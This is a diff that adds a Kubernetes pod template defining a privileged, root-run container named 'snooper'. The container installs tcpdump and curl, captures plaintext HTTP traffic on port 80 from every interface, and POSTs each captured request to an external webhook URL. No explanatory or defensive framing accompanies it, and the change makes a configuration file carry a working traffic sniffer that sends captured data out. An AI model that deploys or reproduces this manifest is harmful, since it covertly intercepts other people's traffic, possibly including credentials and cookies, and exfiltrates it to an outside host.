@@ -1,0 +1,24 @@
+spec:
+  template:
+    spec:
+      containers:
+        - name: snooper
+          image: alpine:latest
+          command: ["/bin/sh", "-c"]
+          args:
+            - |
+              apk add --no-cache tcpdump curl;
+              tcpdump -i any -A port 80 -l |
+              awk '
+                BEGIN { req = "" }
+                {
+                  req = req $0 "\n"
+                  if ($0 == "") {
+                    print req | "curl -X POST -H \"Content-Type: text/plain\" --data-binary @- https://uneven-australia-37.webhook.cool"
+                    close("curl -X POST -H \"Content-Type: text/plain\" --data-binary @- https://uneven-australia-37.webhook.cool")
+                    req = ""
+                  }
+                }'
+          securityContext:
+            runAsUser: 0
+            privileged: true
